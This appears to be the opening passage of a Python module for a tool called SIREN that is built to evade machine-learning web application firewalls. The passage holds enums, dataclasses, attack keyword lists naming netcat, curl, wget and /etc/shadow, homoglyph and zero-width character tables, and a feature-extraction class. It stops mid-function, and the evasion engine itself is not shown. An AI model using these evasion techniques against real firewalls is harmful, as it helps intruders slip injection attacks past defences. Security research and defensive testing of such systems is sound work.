#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  🧬  SIREN ADVERSARIAL ML — Machine Learning WAF Evasion Engine  🧬          ██
██                                                                                ██
██  WAFs treinados com ML nao sao invenciveis. Sao modelos com fronteiras        ██
██  de decisao, e fronteiras podem ser cruzadas.                                  ██
██                                                                                ██
██  Este modulo faz o que NENHUM framework de pentest faz:                        ██
██    * FeatureAnalyzer   — Reverse-engineer features que ML WAFs usam           ██
██    * MLModelProber     — Black-box probing para inferir decision boundary      ██
██    * PerturbationEngine — 40+ tecnicas de perturbacao adversarial             ██
██    * EvasionGenerator  — Evolucao genetica de payloads evasivos               ██
██    * WAFEvader         — Bypass vendor-specific (ModSec, Cloudflare, AWS)     ██
██    * ClassifierFuzzer  — Fuzzing de threshold + transfer attacks              ██
██    * SirenAdversarialML — Orquestrador completo de evasao ML                  ██
██                                                                                ██
██  Capacidades unicas:                                                           ██
██    1. Feature extraction reversa de WAFs ML black-box                          ██
██    2. Algoritmo genetico com selecao por torneio para payloads                ██
██    3. Perturbacoes semanticamente preservadas (payload funciona + evade)       ██
██    4. Transfer attacks cross-WAF (bypass de um generaliza para outro)          ██
██    5. Binary search precisa no threshold de classificacao                      ██
██    6. Homoglyph + zero-width + unicode normalization attacks                   ██
██    7. Adaptive paranoia level exploitation para ModSecurity                    ██
██                                                                                ██
██  "O modelo aprende padroes. SIREN aprende a quebrar padroes."                 ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import copy
import hashlib
import json
import logging
import math
import random
import re
import string
import struct
import threading
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

logger = logging.getLogger("siren.cortex.adversarial_ml")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

MAX_GENERATIONS = 200
POPULATION_SIZE = 60
TOURNAMENT_SIZE = 5
MUTATION_RATE = 0.15
CROSSOVER_RATE = 0.7
ELITE_RATIO = 0.1
BOUNDARY_SEARCH_PRECISION = 0.001
MAX_PROBE_BATCH = 100
FEATURE_DIMENSIONS = 32
MIN_ENTROPY_THRESHOLD = 1.5
MAX_PERTURBATION_DEPTH = 10
TRANSFER_ATTACK_ROUNDS = 50
CLASSIFIER_FUZZ_ITERATIONS = 500
DEFAULT_TIMEOUT = 30.0
EPSILON = 1e-9  # NOTE: Intentionally differs from constants.EPSILON (1e-12) — adversarial ML needs coarser tolerance


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════


class WAFVendor(Enum):
    """Known WAF vendors with ML-based detection."""
    MODSECURITY = auto()
    CLOUDFLARE = auto()
    AWS_WAF = auto()
    AKAMAI = auto()
    IMPERVA = auto()
    F5_BIG_IP = auto()
    BARRACUDA = auto()
    SUCURI = auto()
    FORTIWEB = auto()
    AZURE_WAF = auto()
    GCP_CLOUD_ARMOR = auto()
    RADWARE = auto()
    SIGNAL_SCIENCES = auto()
    WALLARM = auto()
    UNKNOWN = auto()


class EvasionStrategy(Enum):
    """High-level evasion strategy categories."""
    ENCODING_LAYER = auto()
    SEMANTIC_PRESERVATION = auto()
    BOUNDARY_WALKING = auto()
    FEATURE_MASKING = auto()
    TRANSFER_ATTACK = auto()
    GRADIENT_ESTIMATION = auto()
    GENETIC_EVOLUTION = auto()
    POLYMORPHIC_MUTATION = auto()
    HOMOGLYPH_SUBSTITUTION = auto()
    ZERO_WIDTH_INJECTION = auto()
    COMMENT_INJECTION = auto()
    CASE_ALTERNATION = auto()
    WHITESPACE_MANIPULATION = auto()
    UNICODE_NORMALIZATION = auto()
    PAYLOAD_FRAGMENTATION = auto()
    DOUBLE_ENCODING = auto()
    NULL_BYTE_INJECTION = auto()
    HTTP_PARAMETER_POLLUTION = auto()


class PerturbationType(Enum):
    """Specific perturbation technique identifiers."""
    WHITESPACE_INSERT = auto()
    TAB_INSERT = auto()
    NEWLINE_INSERT = auto()
    SQL_COMMENT_INLINE = auto()
    SQL_COMMENT_BLOCK = auto()
    HTML_COMMENT_INJECT = auto()
    CSS_COMMENT_INJECT = auto()
    JS_COMMENT_INJECT = auto()
    CASE_UPPER = auto()
    CASE_LOWER = auto()
    CASE_ALTERNATE = auto()
    CASE_RANDOM = auto()
    URL_ENCODE_SINGLE = auto()
    URL_ENCODE_DOUBLE = auto()
    URL_ENCODE_TRIPLE = auto()
    HTML_ENTITY_DECIMAL = auto()
    HTML_ENTITY_HEX = auto()
    HTML_ENTITY_NAMED = auto()
    UNICODE_FULLWIDTH = auto()
    UNICODE_HALFWIDTH = auto()
    UNICODE_SUPERSCRIPT = auto()
    UNICODE_SUBSCRIPT = auto()
    UNICODE_COMBINING = auto()
    HOMOGLYPH_CYRILLIC = auto()
    HOMOGLYPH_GREEK = auto()
    HOMOGLYPH_MATH = auto()
    ZERO_WIDTH_SPACE = auto()
    ZERO_WIDTH_JOINER = auto()
    ZERO_WIDTH_NON_JOINER = auto()
    NULL_BYTE = auto()
    BACKSPACE_CHAR = auto()
    STRING_CONCAT_SPLIT = auto()
    CHAR_CODE_CONSTRUCT = auto()
    HEX_REPRESENTATION = auto()
    OCTAL_REPRESENTATION = auto()
    BASE64_ENCODE = auto()
    UTF7_ENCODE = auto()
    OVERLONG_UTF8 = auto()
    PARAMETER_POLLUTION = auto()
    CHUNK_TRANSFER = auto()
    MULTIPART_BOUNDARY = auto()
    JSON_UNICODE_ESCAPE = auto()
    NUMERIC_CHAR_REF = auto()
    SEMANTIC_SYNONYM = auto()
    FUNCTION_ALIAS = auto()
    OPERATOR_SUBSTITUTE = auto()


class FeatureType(Enum):
    """Feature types that ML WAFs typically analyze."""
    TOKEN_FREQUENCY = auto()
    STRING_ENTROPY = auto()
    CHAR_DISTRIBUTION = auto()
    PAYLOAD_LENGTH = auto()
    SPECIAL_CHAR_RATIO = auto()
    ENCODING_DEPTH = auto()
    KEYWORD_DENSITY = auto()
    NGRAM_FREQUENCY = auto()
    AST_DEPTH = auto()
    STRUCTURAL_PATTERN = auto()
    STATISTICAL_ANOMALY = auto()
    LEXICAL_PATTERN = auto()
    SEMANTIC_SIGNATURE = auto()
    ENTROPY_GRADIENT = auto()
    BYTE_HISTOGRAM = auto()
    SYMBOL_SEQUENCE = auto()


class ProbeResult(Enum):
    """Result of a WAF probe."""
    BLOCKED = auto()
    ALLOWED = auto()
    CHALLENGED = auto()
    RATE_LIMITED = auto()
    TIMEOUT = auto()
    ERROR = auto()


class PayloadContext(Enum):
    """Context where the payload will be injected."""
    SQL_INJECTION = auto()
    XSS_REFLECTED = auto()
    XSS_STORED = auto()
    COMMAND_INJECTION = auto()
    PATH_TRAVERSAL = auto()
    LDAP_INJECTION = auto()
    XML_INJECTION = auto()
    SSRF = auto()
    SSTI = auto()
    NOSQL_INJECTION = auto()
    HEADER_INJECTION = auto()
    GENERIC = auto()


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════


@dataclass
class FeatureVector:
    """Extracted feature vector from a payload for ML analysis."""
    payload_id: str = ""
    payload_hash: str = ""
    token_frequency: Dict[str, float] = field(default_factory=dict)
    string_entropy: float = 0.0
    char_distribution: Dict[str, float] = field(default_factory=dict)
    payload_length: int = 0
    special_char_ratio: float = 0.0
    encoding_depth: int = 0
    keyword_density: float = 0.0
    ngram_scores: Dict[str, float] = field(default_factory=dict)
    entropy_gradient: List[float] = field(default_factory=list)
    byte_histogram: Dict[int, int] = field(default_factory=dict)
    symbol_sequences: List[str] = field(default_factory=list)
    numeric_ratio: float = 0.0
    uppercase_ratio: float = 0.0
    lowercase_ratio: float = 0.0
    whitespace_ratio: float = 0.0
    printable_ratio: float = 0.0
    max_run_length: int = 0
    unique_char_count: int = 0
    bigram_entropy: float = 0.0
    trigram_entropy: float = 0.0
    feature_vector_raw: List[float] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload_id": self.payload_id,
            "payload_hash": self.payload_hash,
            "token_frequency": self.token_frequency,
            "string_entropy": self.string_entropy,
            "char_distribution": dict(self.char_distribution),
            "payload_length": self.payload_length,
            "special_char_ratio": self.special_char_ratio,
            "encoding_depth": self.encoding_depth,
            "keyword_density": self.keyword_density,
            "ngram_scores": dict(self.ngram_scores),
            "entropy_gradient": list(self.entropy_gradient),
            "byte_histogram": {str(k): v for k, v in self.byte_histogram.items()},
            "symbol_sequences": list(self.symbol_sequences),
            "numeric_ratio": self.numeric_ratio,
            "uppercase_ratio": self.uppercase_ratio,
            "lowercase_ratio": self.lowercase_ratio,
            "whitespace_ratio": self.whitespace_ratio,
            "printable_ratio": self.printable_ratio,
            "max_run_length": self.max_run_length,
            "unique_char_count": self.unique_char_count,
            "bigram_entropy": self.bigram_entropy,
            "trigram_entropy": self.trigram_entropy,
            "feature_vector_raw": list(self.feature_vector_raw),
            "timestamp": self.timestamp,
        }


@dataclass
class AdversarialPayload:
    """A payload that has been adversarially modified for WAF evasion."""
    payload_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    original_payload: str = ""
    mutated_payload: str = ""
    perturbations_applied: List[str] = field(default_factory=list)
    perturbation_types: List[PerturbationType] = field(default_factory=list)
    generation: int = 0
    fitness_score: float = 0.0
    evasion_success: bool = False
    semantic_preserved: bool = True
    context: PayloadContext = PayloadContext.GENERIC
    feature_delta: Dict[str, float] = field(default_factory=dict)
    parent_ids: List[str] = field(default_factory=list)
    mutation_history: List[Dict[str, Any]] = field(default_factory=list)
    waf_responses: List[Dict[str, Any]] = field(default_factory=list)
    confidence: float = 0.0
    encoding_layers: int = 0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload_id": self.payload_id,
            "original_payload": self.original_payload,
            "mutated_payload": self.mutated_payload,
            "perturbations_applied": list(self.perturbations_applied),
            "perturbation_types": [p.name for p in self.perturbation_types],
            "generation": self.generation,
            "fitness_score": self.fitness_score,
            "evasion_success": self.evasion_success,
            "semantic_preserved": self.semantic_preserved,
            "context": self.context.name,
            "feature_delta": dict(self.feature_delta),
            "parent_ids": list(self.parent_ids),
            "mutation_history": list(self.mutation_history),
            "waf_responses": list(self.waf_responses),
            "confidence": self.confidence,
            "encoding_layers": self.encoding_layers,
            "timestamp": self.timestamp,
        }


@dataclass
class EvasionResult:
    """Result of an evasion attempt against a WAF."""
    result_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    payload: AdversarialPayload = field(default_factory=AdversarialPayload)
    waf_vendor: WAFVendor = WAFVendor.UNKNOWN
    strategy_used: EvasionStrategy = EvasionStrategy.ENCODING_LAYER
    probe_result: ProbeResult = ProbeResult.BLOCKED
    http_status: int = 0
    response_time_ms: float = 0.0
    response_headers: Dict[str, str] = field(default_factory=dict)
    response_snippet: str = ""
    is_evasion: bool = False
    confidence: float = 0.0
    boundary_distance: float = 0.0
    feature_importance: Dict[str, float] = field(default_factory=dict)
    perturbation_count: int = 0
    total_attempts: int = 0
    attempt_number: int = 0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "result_id": self.result_id,
            "payload": self.payload.to_dict(),
            "waf_vendor": self.waf_vendor.name,
            "strategy_used": self.strategy_used.name,
            "probe_result": self.probe_result.name,
            "http_status": self.http_status,
            "response_time_ms": self.response_time_ms,
            "response_headers": dict(self.response_headers),
            "response_snippet": self.response_snippet,
            "is_evasion": self.is_evasion,
            "confidence": self.confidence,
            "boundary_distance": self.boundary_distance,
            "feature_importance": dict(self.feature_importance),
            "perturbation_count": self.perturbation_count,
            "total_attempts": self.total_attempts,
            "attempt_number": self.attempt_number,
            "timestamp": self.timestamp,
        }


@dataclass
class EvasionReport:
    """Comprehensive report of an adversarial ML evasion campaign."""
    report_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    target: str = ""
    waf_vendor: WAFVendor = WAFVendor.UNKNOWN
    waf_version: str = ""
    total_payloads_tested: int = 0
    total_evasions_found: int = 0
    evasion_rate: float = 0.0
    strategies_used: List[EvasionStrategy] = field(default_factory=list)
    strategies_success_rate: Dict[str, float] = field(default_factory=dict)
    successful_evasions: List[EvasionResult] = field(default_factory=list)
    failed_attempts: List[EvasionResult] = field(default_factory=list)
    feature_analysis: Dict[str, Any] = field(default_factory=dict)
    boundary_map: Dict[str, float] = field(default_factory=dict)
    inferred_model_type: str = ""
    inferred_features: List[str] = field(default_factory=list)
    perturbation_effectiveness: Dict[str, float] = field(default_factory=dict)
    transfer_attack_results: Dict[str, Any] = field(default_factory=dict)
    genetic_evolution_stats: Dict[str, Any] = field(default_factory=dict)
    recommendations: List[str] = field(default_factory=list)
    duration_seconds: float = 0.0
    start_time: float = field(default_factory=time.time)
    end_time: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "target": self.target,
            "waf_vendor": self.waf_vendor.name,
            "waf_version": self.waf_version,
            "total_payloads_tested": self.total_payloads_tested,
            "total_evasions_found": self.total_evasions_found,
            "evasion_rate": self.evasion_rate,
            "strategies_used": [s.name for s in self.strategies_used],
            "strategies_success_rate": dict(self.strategies_success_rate),
            "successful_evasions": [e.to_dict() for e in self.successful_evasions],
            "failed_attempts_count": len(self.failed_attempts),
            "feature_analysis": dict(self.feature_analysis),
            "boundary_map": dict(self.boundary_map),
            "inferred_model_type": self.inferred_model_type,
            "inferred_features": list(self.inferred_features),
            "perturbation_effectiveness": dict(self.perturbation_effectiveness),
            "transfer_attack_results": dict(self.transfer_attack_results),
            "genetic_evolution_stats": dict(self.genetic_evolution_stats),
            "recommendations": list(self.recommendations),
            "duration_seconds": self.duration_seconds,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "metadata": dict(self.metadata),
        }


@dataclass
class ProbeRecord:
    """Record of a single WAF probe for decision boundary inference."""
    probe_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])
    payload: str = ""
    result: ProbeResult = ProbeResult.BLOCKED
    response_time_ms: float = 0.0
    http_status: int = 0
    feature_vector: Optional[FeatureVector] = None
    perturbation_magnitude: float = 0.0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "probe_id": self.probe_id,
            "payload": self.payload,
            "result": self.result.name,
            "response_time_ms": self.response_time_ms,
            "http_status": self.http_status,
            "feature_vector": self.feature_vector.to_dict() if self.feature_vector else None,
            "perturbation_magnitude": self.perturbation_magnitude,
            "timestamp": self.timestamp,
        }


@dataclass
class DecisionBoundary:
    """Inferred decision boundary of a WAF ML classifier."""
    boundary_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])
    feature_weights: Dict[str, float] = field(default_factory=dict)
    threshold: float = 0.5
    margin: float = 0.0
    confidence: float = 0.0
    support_vectors_blocked: List[str] = field(default_factory=list)
    support_vectors_allowed: List[str] = field(default_factory=list)
    inferred_model_type: str = "unknown"
    probe_count: int = 0
    accuracy_estimate: float = 0.0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "boundary_id": self.boundary_id,
            "feature_weights": dict(self.feature_weights),
            "threshold": self.threshold,
            "margin": self.margin,
            "confidence": self.confidence,
            "support_vectors_blocked": list(self.support_vectors_blocked),
            "support_vectors_allowed": list(self.support_vectors_allowed),
            "inferred_model_type": self.inferred_model_type,
            "probe_count": self.probe_count,
            "accuracy_estimate": self.accuracy_estimate,
            "timestamp": self.timestamp,
        }


# ════════════════════════════════════════════════════════════════════════════════
# HELPER DATA — Keyword and pattern databases
# ════════════════════════════════════════════════════════════════════════════════

SQL_KEYWORDS: Set[str] = {
    "select", "union", "insert", "update", "delete", "drop", "alter", "create",
    "exec", "execute", "xp_", "sp_", "declare", "cast", "convert", "char",
    "nchar", "varchar", "nvarchar", "table", "from", "where", "and", "or",
    "not", "null", "like", "in", "between", "exists", "having", "group",
    "order", "by", "limit", "offset", "join", "inner", "outer", "left",
    "right", "cross", "on", "as", "into", "values", "set", "begin", "end",
    "if", "else", "while", "case", "when", "then", "waitfor", "delay",
    "benchmark", "sleep", "load_file", "outfile", "dumpfile", "information_schema",
    "concat", "group_concat", "substring", "ascii", "hex", "unhex", "md5",
}

XSS_KEYWORDS: Set[str] = {
    "script", "alert", "prompt", "confirm", "eval", "javascript", "onerror",
    "onload", "onclick", "onmouseover", "onfocus", "onblur", "onsubmit",
    "document", "cookie", "window", "location", "innerhtml", "outerhtml",
    "src", "href", "img", "iframe", "svg", "object", "embed", "applet",
    "form", "input", "body", "div", "style", "expression", "import",
    "fetch", "xmlhttprequest", "constructor", "prototype", "__proto__",
    "settimeout", "setinterval", "function", "return", "var", "let", "const",
}

CMD_KEYWORDS: Set[str] = {
    "cat", "ls", "dir", "type", "echo", "whoami", "id", "uname", "pwd",
    "wget", "curl", "nc", "netcat", "bash", "sh", "cmd", "powershell",
    "python", "perl", "ruby", "php", "java", "ping", "nslookup", "dig",
    "ifconfig", "ipconfig", "net", "systeminfo", "passwd", "shadow",
    "etc", "proc", "dev", "tmp", "var", "usr", "bin", "sbin", "opt",
}

# Homoglyph mappings: ASCII -> visually similar Unicode characters
HOMOGLYPH_MAP: Dict[str, List[str]] = {
    "a": ["\u0430", "\u00e0", "\u00e1", "\u1ea1", "\u0251"],
    "c": ["\u0441", "\u00e7", "\u0188", "\u023c"],
    "d": ["\u0501", "\u0257", "\u018a"],
    "e": ["\u0435", "\u00e8", "\u00e9", "\u0117", "\u1eb9"],
    "h": ["\u04bb", "\u0570", "\u210e"],
    "i": ["\u0456", "\u00ec", "\u00ed", "\u0131"],
    "j": ["\u0458", "\u029d"],
    "k": ["\u043a", "\u0199"],
    "l": ["\u04cf", "\u0131", "\u217c"],
    "m": ["\u043c", "\u0271"],
    "n": ["\u0578", "\u057c"],
    "o": ["\u043e", "\u00f2", "\u00f3", "\u01a1", "\u1ecd"],
    "p": ["\u0440", "\u1d71"],
    "q": ["\u051b", "\u0566"],
    "r": ["\u0433", "\u0280"],
    "s": ["\u0455", "\u015f", "\u0219"],
    "t": ["\u0442", "\u0163", "\u021b"],
    "u": ["\u0446", "\u00f9", "\u00fa"],
    "v": ["\u0475", "\u03bd"],
    "w": ["\u051d", "\u0461"],
    "x": ["\u0445", "\u04b3"],
    "y": ["\u0443", "\u00fd", "\u04af"],
    "z": ["\u0437", "\u017a", "\u017c"],
    "A": ["\u0410", "\u00c0", "\u00c1"],
    "B": ["\u0412", "\u0392"],
    "C": ["\u0421", "\u00c7", "\u216d"],
    "D": ["\u0500", "\u216e"],
    "E": ["\u0415", "\u00c8", "\u00c9"],
    "H": ["\u041d", "\u0397"],
    "I": ["\u0406", "\u00cc", "\u00cd", "\u2160"],
    "K": ["\u041a", "\u039a"],
    "L": ["\u216c"],
    "M": ["\u041c", "\u039c", "\u216f"],
    "N": ["\u039d"],
    "O": ["\u041e", "\u039f", "\u00d2", "\u00d3"],
    "P": ["\u0420", "\u03a1"],
    "S": ["\u0405"],
    "T": ["\u0422", "\u03a4"],
    "V": ["\u2164"],
    "X": ["\u0425", "\u03a7", "\u2169"],
    "Y": ["\u04ae", "\u03a5"],
    "Z": ["\u0396"],
}

# Zero-width characters for injection
ZERO_WIDTH_CHARS: List[str] = [
    "\u200b",  # Zero Width Space
    "\u200c",  # Zero Width Non-Joiner
    "\u200d",  # Zero Width Joiner
    "\u2060",  # Word Joiner
    "\ufeff",  # Zero Width No-Break Space (BOM)
    "\u180e",  # Mongolian Vowel Separator
    "\u200e",  # Left-to-Right Mark
    "\u200f",  # Right-to-Left Mark
]

# SQL comment styles for injection
SQL_COMMENT_VARIANTS: List[str] = [
    "/**/", "/*!*/", "/*! */", "/**_**/", "/*--*/",
    "/* */", "/*\t*/", "/*\n*/", "/*\r\n*/",
]

# Fullwidth character mapping (ASCII -> Fullwidth Unicode)
FULLWIDTH_OFFSET = 0xFEE0  # Add to ASCII code (0x21-0x7E) to get fullwidth


# ════════════════════════════════════════════════════════════════════════════════
# FeatureAnalyzer — Reverse-engineer ML WAF feature extraction
# ════════════════════════════════════════════════════════════════════════════════


class FeatureAnalyzer:
    """
    Analyzes what features an ML-based WAF likely uses for classification.

    Reverse-engineers the feature extraction pipeline by computing the same
    features that ML models typically use: token frequency, string entropy,
    character distribution, payload length, special char ratio, encoding
    depth, keyword density — all computed with stdlib math.

    Usage:
        analyzer = FeatureAnalyzer()
        vector = analyzer.extract_features("' OR 1=1 --")
        importance = analyzer.estimate_feature_importance(probes)
        dominant = analyzer.get_dominant_features(vector)
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._feature_cache: Dict[str, FeatureVector] = {}
        self._importance_scores: Dict[str, float] = {}
        self._extraction_count: int = 0
        self._sql_pattern = re.compile(
            r"(?i)\b(" + "|".join(re.escape(k) for k in SQL_KEYWORDS) + r")\b"
        )
        self._xss_pattern = re.compile(
            r"(?i)\b(" + "|".join(re.escape(k) for k in XSS_KEYWORDS) + r")\b"
        )
        self._cmd_pattern = re.compile(
            r"(?i)\b(" + "|".join(re.escape(k) for k in CMD_KEYWORDS) + r")\b"
        )
        self._special_chars = set("!@#$%^&*()_+-=[]{}|;':\",./<>?`~\\")
        logger.info("FeatureAnalyzer initialized")

    def extract_features(self, payload: str) -> FeatureVector:
        """Extract comprehensive feature vector from a payload."""
        with self._lock:
            payload_hash = hashlib.sha256(payload.encode("utf-8", errors="replace")).hexdigest()[:16]
            if payload_hash in self._feature_cache:
                return self._feature_cache[payload_hash]

            vector = FeatureVector(
                payload_id=uuid.uuid4().hex[:16],
                payload_hash=payload_hash,
            )

            vector.payload_length = len(payload)
            vector.string_entropy = self._compute_entropy(payload)
            vector.char_distribution = self._compute_char_distribution(payload)
            vector.token_frequency = self._compute_token_frequency(payload)
            vector.special_char_ratio = self._compute_special_char_ratio(payload)
            vector.encoding_depth = self._detect_encoding_depth(payload)
            vector.keyword_density = self._compute_keyword_density(payload)
            vector.ngram_scores = self._compute_ngram_scores(payload)
            vector.entropy_gradient = self._compute_entropy_gradient(payload)
            vector.byte_histogram = self._compute_byte_histogram(payload)
            vector.symbol_sequences = self._extract_symbol_sequences(payload)
            vector.numeric_ratio = self._compute_char_class_ratio(payload, str.isdigit)
            vector.uppercase_ratio = self._compute_char_class_ratio(payload, str.isupper)
            vector.lowercase_ratio = self._compute_char_class_ratio(payload, str.islower)
            vector.whitespace_ratio = self._compute_char_class_ratio(payload, str.isspace)
            vector.printable_ratio = self._compute_printable_ratio(payload)
            vector.max_run_length = self._compute_max_run_length(payload)
            vector.unique_char_count = len(set(payload))
            vector.bigram_entropy = self._compute_ngram_entropy(payload, 2)
            vector.trigram_entropy = self._compute_ngram_entropy(payload, 3)
            vector.feature_vector_raw = self._build_raw_vector(vector)

            self._feature_cache[payload_hash] = vector
            self._extraction_count += 1

            return vector

    def _compute_entropy(self, text: str) -> float:
        """Compute Shannon entropy of a string."""
        if not text:
            return 0.0
        freq: Dict[str, int] = defaultdict(int)
        for ch in text:
            freq[ch] += 1
        length = len(text)
        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        return round(entropy, 6)

    def _compute_char_distribution(self, text: str) -> Dict[str, float]:
        """Compute character class distribution."""
        if not text:
            return {}
        total = len(text)
        classes = {
            "alpha_upper": 0, "alpha_lower": 0, "digit": 0,
            "space": 0, "special": 0, "control": 0, "high_unicode": 0,
        }
        for ch in text:
            cp = ord(ch)
            if ch.isupper():
                classes["alpha_upper"] += 1
            elif ch.islower():
                classes["alpha_lower"] += 1
            elif ch.isdigit():
                classes["digit"] += 1
            elif ch.isspace():
                classes["space"] += 1
            elif cp < 32 or cp == 127:
                classes["control"] += 1
            elif cp > 127:
                classes["high_unicode"] += 1
            else:
                classes["special"] += 1
        return {k: round(v / total, 6) for k, v in classes.items()}

    def _compute_token_frequency(self, text: str) -> Dict[str, float]:
        """Compute frequency of known attack tokens."""
        tokens: Dict[str, float] = {}
        text_lower = text.lower()
        total_len = max(len(text_lower), 1)

        for keyword in SQL_KEYWORDS:
            count = text_lower.count(keyword)
            if count > 0:
                tokens[f"sql:{keyword}"] = count / total_len

        for keyword in XSS_KEYWORDS:
            count = text_lower.count(keyword)
            if count > 0:
                tokens[f"xss:{keyword}"] = count / total_len

        for keyword in CMD_KEYWORDS:
            count = text_lower.count(keyword)
            if count > 0:
                tokens[f"cmd:{keyword}"] = count / total_len

        return tokens

    def _compute_special_char_ratio(self, text: str) -> float:
        """Compute ratio of special characters."""
        if not text:
            return 0.0
        count = sum(1 for ch in text if ch in self._special_chars)
        return round(count / len(text), 6)

    def _detect_encoding_depth(self, text: str) -> int:
        """Detect how many layers of encoding are present."""
        depth = 0
        current = text

        # URL encoding detection
        url_pattern = re.compile(r"%[0-9a-fA-F]{2}")
        double_url_pattern = re.compile(r"%25[0-9a-fA-F]{2}")
        if double_url_pattern.search(current):
            depth += 2
        elif url_pattern.search(current):
            depth += 1

        # HTML entity detection
        html_dec = re.compile(r"&#\d+;")
        html_hex = re.compile(r"&#x[0-9a-fA-F]+;")
        html_named = re.compile(r"&[a-zA-Z]+;")
        if html_dec.search(current) or html_hex.search(current):
            depth += 1
        if html_named.search(current):
            depth += 1

        # Unicode escape detection
        unicode_esc = re.compile(r"\\u[0-9a-fA-F]{4}")
        if unicode_esc.search(current):
            depth += 1

        # Base64-like detection (heuristic)
        b64_pattern = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")
        if b64_pattern.search(current):
            depth += 1

        # Hex encoding detection
        hex_pattern = re.compile(r"(?:0x[0-9a-fA-F]{2,}|\\x[0-9a-fA-F]{2})")
        if hex_pattern.search(current):
            depth += 1

        return depth

    def _compute_keyword_density(self, text: str) -> float:
        """Compute density of attack-related keywords."""
        if not text:
            return 0.0
        text_lower = text.lower()
        words = re.findall(r"[a-zA-Z_]+", text_lower)
        if not words:
            return 0.0
        all_keywords = SQL_KEYWORDS | XSS_KEYWORDS | CMD_KEYWORDS
        matches = sum(1 for w in words if w in all_keywords)
        return round(matches / len(words), 6)

    def _compute_ngram_scores(self, text: str, n_values: Tuple[int, ...] = (2, 3, 4)) -> Dict[str, float]:
        """Compute n-gram frequency scores for suspicious patterns."""
        scores: Dict[str, float] = {}
        suspicious_bigrams = {"or", "an", "un", "se", "ex", "sc", "al", "on", "er"}
        suspicious_trigrams = {"sel", "uni", "scr", "ale", "exe", "ins", "del", "dro"}

        text_lower = text.lower()
        for n in n_values:
            if len(text_lower) < n:
                continue
            ngrams: Dict[str, int] = defaultdict(int)
            for i in range(len(text_lower) - n + 1):
                ngrams[text_lower[i:i + n]] += 1
            total = sum(ngrams.values())
            if total == 0:
                continue

            if n == 2:
                for bg in suspicious_bigrams:
                    if bg in ngrams:
                        scores[f"bg:{bg}"] = ngrams[bg] / total
            elif n == 3:
                for tg in suspicious_trigrams:
                    if tg in ngrams:
                        scores[f"tg:{tg}"] = ngrams[tg] / total

            top_ngrams = sorted(ngrams.items(), key=lambda x: x[1], reverse=True)[:5]
            for gram, count in top_ngrams:
                scores[f"n{n}:{gram}"] = count / total

        return scores

    def _compute_entropy_gradient(self, text: str, window_size: int = 16) -> List[float]:
        """Compute entropy across sliding windows (detects encoded sections)."""
        if len(text) < window_size:
            return [self._compute_entropy(text)] if text else [0.0]
        gradient = []
        step = max(1, window_size // 4)
        for i in range(0, len(text) - window_size + 1, step):
            window = text[i:i + window_size]
            gradient.append(round(self._compute_entropy(window), 4))
        return gradient

    def _compute_byte_histogram(self, text: str) -> Dict[int, int]:
        """Compute byte frequency histogram."""
        hist: Dict[int, int] = defaultdict(int)
        for byte_val in text.encode("utf-8", errors="replace"):
            hist[byte_val] += 1
        return dict(hist)

    def _extract_symbol_sequences(self, text: str, min_len: int = 2) -> List[str]:
        """Extract sequences of non-alphanumeric characters."""
        sequences = re.findall(r"[^a-zA-Z0-9\s]{" + str(min_len) + r",}", text)
        return sequences[:20]  # Cap to avoid huge lists

    def _compute_char_class_ratio(self, text: str, predicate: Callable[[str], bool]) -> float:
        """Compute ratio of characters matching a predicate."""
        if not text:
            return 0.0
        count = sum(1 for ch in text if predicate(ch))
        return round(count / len(text), 6)

    def _compute_printable_ratio(self, text: str) -> float:
        """Compute ratio of printable characters."""
        if not text:
            return 0.0
        printable = set(string.printable)
        count = sum(1 for ch in text if ch in printable)
        return round(count / len(text), 6)

    def _compute_max_run_length(self, text: str) -> int:
        """Compute maximum run length of the same character."""
        if not text:
            return 0
        max_run = 1
        current_run = 1
        for i in range(1, len(text)):
            if text[i] == text[i - 1]:
                current_run += 1
                max_run = max(max_run, current_run)
            else:
                current_run = 1
        return max_run

    def _compute_ngram_entropy(self, text: str, n: int) -> float:
        """Compute entropy of n-grams."""
        if len(text) < n:
            return 0.0
        ngrams: Dict[str, int] = defaultdict(int)
        for i in range(len(text) - n + 1):
            ngrams[text[i:i + n]] += 1
        total = sum(ngrams.values())
        entropy = 0.0
        for count in ngrams.values():
            p = count / total
            if p > 0:
                entropy -= p * math.log2(p)
        return round(entropy, 6)

    def _build_raw_vector(self, fv: FeatureVector) -> List[float]:
        """Build a flat numeric vector from the feature vector."""
        raw: List[float] = [
            float(fv.payload_length),
            fv.string_entropy,
            fv.special_char_ratio,
            float(fv.encoding_depth),
            fv.keyword_density,
            fv.numeric_ratio,
            fv.uppercase_ratio,
            fv.lowercase_ratio,
            fv.whitespace_ratio,
            fv.printable_ratio,
            float(fv.max_run_length),
            float(fv.unique_char_count),
            fv.bigram_entropy,
            fv.trigram_entropy,
        ]

